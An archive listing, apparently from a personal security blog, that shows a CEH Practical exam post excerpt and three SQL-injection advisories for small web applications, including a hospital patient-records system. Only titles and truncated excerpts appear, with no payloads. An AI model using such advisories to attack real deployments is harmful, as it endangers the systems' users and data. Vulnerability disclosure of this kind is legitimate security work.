+    <p class="archive__item-excerpt" itemprop="description">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
+- Date: 07/01/2022
+- Exploit Au...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
+- Date: 05/01/20222
+- Exploit Author: tw...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
+- Date: 2021-12-30
+- ...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
+    
+      <li><strong>Follow:</strong></li>
+    
+    
+      
+        
+      
+          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
+          </li>
+        
+      
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+
+</div>
+<div class="page__footer-copyright">&copy; 2023 Tri Wanda Septian's Blog and Stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/hackthebox%20machine/htb-machine-openadmin/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox%20machine/htb-machine-openadmin"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
